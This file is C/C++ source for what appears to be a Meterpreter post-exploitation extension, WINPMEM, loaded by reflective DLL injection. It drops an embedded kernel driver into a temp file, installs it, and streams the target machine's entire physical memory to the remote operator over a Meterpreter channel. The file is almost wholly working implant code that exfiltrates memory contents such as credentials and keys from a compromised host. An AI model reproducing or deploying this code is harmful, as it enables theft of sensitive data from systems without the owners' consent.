extern "C" {
	/*!
	 * @file WINPMEM.cpp
	 * @brief Entry point and intialisation functionality for the WINPMEM extention.
	 */
#include "common.h"
#include "common_metapi.h"

#define RDIDLL_NOEXPORT
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

#ifndef min
#define min(x,y) ((x)<(y)?(x):(y))
#endif

	// Required so that use of the API works.
	MetApi* met_api = NULL;

	DWORD dump_ram(Remote* remote, Packet* packet);

	Command customCommands[] =
	{
		COMMAND_REQ(COMMAND_ID_WINPMEM_DUMP_RAM, dump_ram),
		COMMAND_TERMINATOR
	};

	/*!
	 * @brief Initialize the server extension.
	 * @param api Pointer to the Meterpreter API structure.
	 * @param remote Pointer to the remote instance.
	 * @return Indication of success or failure.
	 */
	DWORD InitServerExtension(MetApi* api, Remote* remote)
	{
		met_api = api;

		met_api->command.register_all(customCommands);

		return ERROR_SUCCESS;
	}

	/*!
	 * @brief Deinitialize the server extension.
	 * @param remote Pointer to the remote instance.
	 * @return Indication of success or failure.
	 */
	DWORD DeinitServerExtension(Remote* remote)
	{
		met_api->command.deregister_all(customCommands);

		return ERROR_SUCCESS;
	}

	/*!
	 * @brief Do a stageless initialisation of the extension.
	 * @param ID of the extension that the init was intended for.
	 * @param buffer Pointer to the buffer that contains the init data.
	 * @param bufferSize Size of the \c buffer parameter.
	 * @return Indication of success or failure.
	 */
	DWORD StagelessInit(UINT extensionId, const LPBYTE buffer, DWORD bufferSize)
	{
		return ERROR_SUCCESS;
	}

	/*!
	 * @brief Callback for when a command has been added to the meterpreter instance.
	 * @param commandId The ID of the command that has been added.
	 */
	VOID CommandAdded(UINT commandId)
	{
	}
}

#include "winpmem_meterpreter.h"

int WinPmem_meterpreter::extract_file_(__int64 resource_id, TCHAR* filename)
{
	int result = -1;
	HANDLE out_fd = INVALID_HANDLE_VALUE;

	// Locate the driver resource in the .EXE file.
	HRSRC hRes = FindResource(hAppInstance, MAKEINTRESOURCE(resource_id), L"FILE");
	do
	{
		if (hRes == NULL)
		{
			dprintf("[WINPMEM] Could not locate driver resource.");
			break;
		}

		HGLOBAL hResLoad = LoadResource(hAppInstance, hRes);
		if (hResLoad == NULL)
		{
			dprintf("[WINPMEM] Could not load driver resource.");
			break;
		}

		VOID* lpResLock = LockResource(hResLoad);
		if (lpResLock == NULL)
		{
			dprintf("[WINPMEM] Could not lock driver resource.");
			break;
		}

		DWORD size = SizeofResource(hAppInstance, hRes);

		// Now open the filename and write the driver image on it.
		HANDLE out_fd = CreateFile(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		if (out_fd == INVALID_HANDLE_VALUE)
		{
			dprintf("[WINPMEM] Can not create temporary file.");
			break;
		};

		if (!WriteFile(out_fd, lpResLock, size, &size, NULL))
		{
			dprintf("[WINPMEM] Can not write to temporary file.");
			break;
		}

		result = 0;
	} while (0);

	if (out_fd != NULL && out_fd != INVALID_HANDLE_VALUE)
	{
		CloseHandle(out_fd);
	}

	return result;
};

HANDLE WinPmem_meterpreter::get_fd()
{
	return fd_;
}

uint64_t WinPmem_meterpreter::get_max_physical_memory()
{
	return max_physical_memory_;
}

int WinPmem_meterpreter64::extract_driver()
{
	// 64 bit drivers use PTE acquisition by default.
	default_mode_ = PMEM_MODE_PTE;

	if (!driver_filename_)
	{
		TCHAR path[MAX_PATH + 1];
		TCHAR filename[MAX_PATH + 1];

		// Gets the temp path env string (no guarantee it's a valid path).
		if (!GetTempPath(MAX_PATH, path))
		{
			dprintf("[WINPMEM] Unable to determine temporary path.");
			return -1;
		}

		GetTempFileName(path, service_name, 0, filename);
		set_driver_filename(filename);

		driver_is_tempfile_ = true;
	};

	dprintf("[WINPMEM] Extracting driver to %s", driver_filename_);

	return extract_file_(WINPMEM_64BIT_DRIVER, driver_filename_);
}

int WinPmem_meterpreter32::extract_driver()
{
	// 32 bit acquisition defaults to physical device.
	default_mode_ = PMEM_MODE_PHYSICAL;

	if (!driver_filename_)
	{
		TCHAR path[MAX_PATH + 1];
		TCHAR filename[MAX_PATH + 1];

		// Gets the temp path env string (no guarantee it's a valid path).
		if (!GetTempPath(MAX_PATH, path))
		{
			dprintf("[WINPMEM] Unable to determine temporary path.");
			return -1;
		}

		GetTempFileName(path, service_name, 0, filename);
		set_driver_filename(filename);

		driver_is_tempfile_ = true;
	};

	dprintf("[WINPMEM] Extracting driver to %s", driver_filename_);

	return extract_file_(WINPMEM_32BIT_DRIVER, driver_filename_);
}

WinPmem_meterpreter *WinPmemFactory()
{
	SYSTEM_INFO sys_info = {0};

	GetNativeSystemInfo(&sys_info);
	switch (sys_info.wProcessorArchitecture)
	{
	case PROCESSOR_ARCHITECTURE_AMD64:
		return new WinPmem_meterpreter64();

	case PROCESSOR_ARCHITECTURE_INTEL:
		return new WinPmem_meterpreter32();

	default:
		return NULL;
	}
};

DWORD dump_ram(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	DWORD result;
	result = WINPMEM_ERROR_UNKNOWN;
	__int64 status;
	DWORD size;
	DWORD mode = PMEM_MODE_AUTO;
	PoolChannelOps chops = {0};

	WinPmem_meterpreter *pmem_handle = WinPmemFactory();
	TCHAR *driver_filename = NULL;
	TCHAR *pagefile_path = L"C:\\pagefile.sys";
	BOOL acquire_pagefile = FALSE;

	status = pmem_handle->install_driver();
	if (status > 0)
	{
		pmem_handle->set_acquisition_mode(mode);
		result = WINPMEM_ERROR_SUCCESS;
	}
	else {
		result = WINPMEM_ERROR_FAILED_LOAD_DRIVER;
		dprintf("[WINPMEM] Failed to load winpmem driver");
		goto end;
	}

	// Somewhere to store the info from the driver;
	struct PmemMemoryInfo info;

	RtlZeroMemory(&info, sizeof(info));

	// Get the memory ranges.
	if (!DeviceIoControl(pmem_handle->get_fd(), PMEM_INFO_IOCTRL, NULL, 0, (char *)&info,
		sizeof(info), &size, NULL))
	{
		dprintf("[WINPMEM] Failed to get memory geometry");
		result = WINPMEM_ERROR_FAILED_MEMORY_GEOMETRY;
		goto end;
	};

	// Initialize max_physical_memory_ when calling print_memory_info !!!!
	pmem_handle->print_memory_info();

	Channel *newChannel;

	WinpmemContext *ctx;
	// Allocate storage for the Winpmem context
	if (!(ctx = (WinpmemContext*)calloc(1, sizeof(WinpmemContext))))
	{
		dprintf("[WINPMEM] Failed to allocate memory");
		result = WINPMEM_ERROR_FAILED_ALLOCATE_MEMORY;
		goto end;
	}

	ctx->winpmem = pmem_handle;
	ctx->pmem_info = info;
	ctx->offset = 0;
	ctx->index = 0;

	// Initialize the pool operation handlers
	chops.native.context = ctx;
	chops.native.close = winpmem_channel_close;
	chops.read = winpmem_channel_read;
	chops.eof = winpmem_channel_eof;

	if (!(newChannel = met_api->channel.create_pool(0, CHANNEL_FLAG_SYNCHRONOUS | CHANNEL_FLAG_COMPRESS, &chops)))
	{
		result = WINPMEM_ERROR_UNKNOWN;
		dprintf("[WINPMEM] Failed to get Meterpreter Channel");
		result = WINPMEM_ERROR_FAILED_METERPRETER_CHANNEL;
		goto end;
	}

	met_api->channel.set_type(newChannel, "winpmem");
	met_api->packet.add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, met_api->channel.get_id(newChannel));
	met_api->packet.add_tlv_qword(response, TLV_TYPE_WINPMEM_MEMORY_SIZE, pmem_handle->get_max_physical_memory());
end:
	met_api->packet.add_tlv_uint(response, TLV_TYPE_WINPMEM_ERROR_CODE, result);
	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);
	return ERROR_SUCCESS;
}

static DWORD winpmem_channel_close(Channel *channel, Packet *request,
	LPVOID context)
{
	WinpmemContext *ctx = (WinpmemContext *)context;
	ctx->winpmem->uninstall_driver();
	return ERROR_SUCCESS;
}

static DWORD winpmem_channel_eof(Channel *channel, Packet *request,
	LPVOID context, LPBOOL iseof)
{
	WinpmemContext *ctx = (WinpmemContext *)context;
	*iseof = ctx->index >= ctx->pmem_info.NumberOfRuns.QuadPart;
	return ERROR_SUCCESS;
}

static int winpmem_meterpreter_copy_memory(uint64_t start, uint64_t end,
		WinpmemContext *ctx, LPVOID buffer, DWORD bufferSize,
		LPDWORD bytesRead)
{
	LARGE_INTEGER large_start;

	if (start >= ctx->winpmem->get_max_physical_memory())
	{
		return 0;
	};

	// Clamp the region to the top of physical memory.
	if (end > ctx->winpmem->get_max_physical_memory())
	{
		end = ctx->winpmem->get_max_physical_memory();
	};

	while (start < end)
	{
		DWORD to_write = (DWORD)min(bufferSize - *bytesRead, end - start);
		DWORD bytes_read = 0;

		large_start.QuadPart = start;

		if (0xFFFFFFFF == SetFilePointerEx(
			ctx->winpmem->get_fd(), large_start, NULL, FILE_BEGIN))
		{
			dprintf("[WINPMEM] Failed to seek in the pmem device.");
			return 0;
		};

		if (!ReadFile(ctx->winpmem->get_fd(), reinterpret_cast<char*>(buffer)+*bytesRead, to_write, &bytes_read, NULL) ||
			bytes_read != to_write)
		{
			dprintf("[WINPMEM] Failed to Read memory.");
			return 0;
		};

		*bytesRead += bytes_read;

		start += bytes_read;
	};
	return 1;
};

static DWORD winpmem_channel_read(Channel* channel, Packet* request,
	LPVOID context, LPVOID buffer, DWORD bufferSize, LPDWORD bytesRead)
{
	WinpmemContext* ctx = (WinpmemContext*)context;
	uint64_t offset = ctx->offset;
	*bytesRead = 0;
	if (ctx->index >= ctx->pmem_info.NumberOfRuns.QuadPart)
	{
		dprintf("[WINPMEM] Memory end reached.");
		return ERROR_SUCCESS;
	}

	if (ctx->pmem_info.Run[ctx->index].start > ctx->offset)
	{
		uint64_t padding_size = ctx->pmem_info.Run[ctx->index].start - ctx->offset;
		DWORD padding_size_max = (DWORD)min(padding_size, bufferSize);
		ZeroMemory(buffer, padding_size_max);
		*bytesRead += padding_size_max;
		offset += *bytesRead;
	}

	if (bufferSize - *bytesRead > 0)
	{
		uint64_t end = min(ctx->pmem_info.Run[ctx->index].length, bufferSize - *bytesRead);
		end += offset;
		DWORD status = winpmem_meterpreter_copy_memory(offset, end, ctx, buffer, bufferSize, bytesRead);
		if (status == 0)
		{
			dprintf("[WINPMEM] Failed in winpmem_meterpreter_copy_memory.");
		}
	}

	ctx->offset += *bytesRead;

	if (ctx->offset >= ctx->pmem_info.Run[ctx->index].start + ctx->pmem_info.Run[ctx->index].length)
	{
		ctx->index++;
	}
	return ERROR_SUCCESS;
}
